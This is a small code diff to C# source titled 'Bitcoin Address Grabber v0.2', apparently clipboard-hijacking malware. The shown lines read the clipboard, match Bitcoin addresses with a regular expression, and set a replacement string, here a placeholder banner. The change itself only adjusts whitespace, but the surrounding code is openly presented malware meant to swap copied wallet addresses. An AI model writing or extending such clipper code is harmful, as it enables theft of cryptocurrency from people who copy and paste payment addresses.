@@ -3,6 +3,7 @@ using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Text.RegularExpressions;
+
 /*
  * │ Author       : NYAN CAT
  * │ Name         : Bitcoin Address Grabber v0.2
@@ -89,7 +90,7 @@ namespace Bitcoin_Grabber
 
                     string input = Clipboard.GetText();
                     string pattern = @"(?:\s|^)(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}(?:\s|$)";
-                    string replacement = "<<! Bitcoin Grabber By NYAN CAT !>>";
+                    string replacement = " <<! Bitcoin Grabber By NYAN CAT !>> ";
 
                     Regex rgx = new Regex(pattern);
                     Match match = rgx.Match(input);
